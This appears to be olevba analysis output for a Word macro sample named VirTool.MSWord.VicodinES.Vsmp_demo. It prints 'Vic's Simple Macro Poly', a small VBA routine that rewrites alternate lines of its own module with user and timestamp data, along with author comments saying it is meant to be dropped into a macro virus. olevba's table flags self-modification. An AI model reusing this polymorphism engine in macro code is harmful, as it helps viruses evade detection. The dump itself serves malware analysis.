olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.VicodinES.Vsmp_demo-64cc4cbb7796525596487d97884372f0521a5aef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.VicodinES.Vsmp_demo-64cc4cbb7796525596487d97884372f0521a5aef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VSMP_DEMO.bas 
in file: VirTool.MSWord.VicodinES.Vsmp_demo-64cc4cbb7796525596487d97884372f0521a5aef - OLE stream: 'Macros/VBA/VSMP_DEMO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function VSMP()

Y = Application.VBE.ActiveVBProject.VBComponents("VSMP_DEMO").CodeModule.CountOfLines

With Application.VBE.ActiveVBProject.VBComponents("VSMP_DEMO").CodeModule

For x = 2 To Y Step 2

.ReplaceLine x, "' " & Application.UserInitials & Now & Application.UserName & Application.ActivePrinter & Now

Next x

End With

End Function

' Vic's Simple Macro Poly

' Replace "VSMP_DEMO" with the name of your macro vius

' Remove these comments

' peace,

'   VicodinES /CB /TNN
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

